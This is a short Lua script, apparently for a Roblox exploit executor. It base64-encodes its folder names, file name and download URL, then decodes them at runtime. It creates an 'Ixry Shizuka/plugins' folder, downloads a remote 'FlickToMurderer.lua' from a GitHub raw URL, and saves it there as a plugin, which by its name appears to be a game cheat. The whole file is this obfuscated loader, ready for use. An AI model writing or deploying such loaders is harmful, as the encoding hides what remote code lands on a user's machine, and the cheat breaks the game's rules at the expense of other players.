local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' 

local function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local root = dec("SXhyeSBTaGl6dWth") 
local plugDir = root .. dec("L3BsdWdpbnM=")
local addon = plugDir .. dec("L0ZsaWNrVG9NdXJkZXJlci5sdWE=")

if not isfolder(root) then makefolder(root) end
if not isfolder(plugDir) then makefolder(plugDir) end

local link = dec("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MtMC1hLWQvT3ZlcmRpdmUtSC9yZWZzL2hlYWRzL21haW4vRmxpY2tUb011cmRlcmVyLmx1YQ==")
local data = game:HttpGet(link)
writefile(addon, data)
